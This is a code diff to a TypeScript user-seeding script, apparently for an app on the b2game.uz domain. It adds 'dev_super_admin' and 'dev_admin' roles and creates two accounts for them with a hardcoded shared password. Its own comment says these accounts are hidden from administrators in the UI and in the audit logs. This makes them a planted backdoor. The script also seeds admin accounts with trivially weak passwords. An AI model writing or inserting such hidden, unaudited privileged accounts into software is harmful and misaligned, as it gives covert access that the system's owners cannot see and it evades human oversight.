@@ -41,7 +41,7 @@ const removedBranchAdminEmails = [
   "admin.samarqand@b2game.uz",
 ] as const;
 
-async function upsertUser(name: string, email: string, password: string, role: "admin" | "super_admin", branchId: string | null) {
+async function upsertUser(name: string, email: string, password: string, role: "admin" | "super_admin" | "dev_admin" | "dev_super_admin", branchId: string | null) {
   const hash = await bcrypt.hash(password, 10);
   const { rows } = await pool.query(
     `insert into users(name,email,password_hash,role,branch_id)
@@ -95,6 +95,9 @@ async function run() {
       branchRows[rows[0].code] = rows[0].id;
     }
 
+    // Hidden developer accounts — invisible to super_admin/admin in the UI and audit logs.
+    await upsertUser("Dev Super Admin", "devsuper@b2game.uz", "devb2game2026", "dev_super_admin", null);
+    await upsertUser("Dev Admin", "devadmin@b2game.uz", "devb2game2026", "dev_admin", branchRows.MAIN);
     await upsertUser("Super Admin", "superadmin@b2game.uz", "12345678", "super_admin", null);
     await upsertUser("Main Admin", "admin.main@b2game.uz", "admin123", "admin", branchRows.MAIN);
     await upsertUser("Main Admin", "admin@b2game.uz", "admin123", "admin", branchRows.MAIN);
